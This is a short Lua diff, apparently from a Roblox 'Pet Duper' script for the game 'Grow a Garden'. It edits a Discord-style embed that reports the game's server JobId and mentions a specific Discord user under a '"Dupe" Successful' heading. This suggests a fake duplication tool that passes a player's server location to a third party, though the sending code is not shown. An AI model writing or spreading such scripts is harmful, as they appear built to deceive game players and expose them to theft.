@@ -6,7 +6,7 @@ local Time = os.date('!*t', OSTime);
 local TestTitle = 'Pet Duper';
 local Embed = {
     title = 'Pets';
-    color = '99999';
+    color = '000000';
     footer = { text = game.JobId };
     author = {
         name = 'Grow a Garden';
@@ -14,8 +14,8 @@ local Embed = {
     };
     fields = {
         {
-            name = '<@568416088543723561>';
-            value = test2;
+            name = '"Dupe" Successful';
+            value = '<@568416088543723561>';
         }
     };
     timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
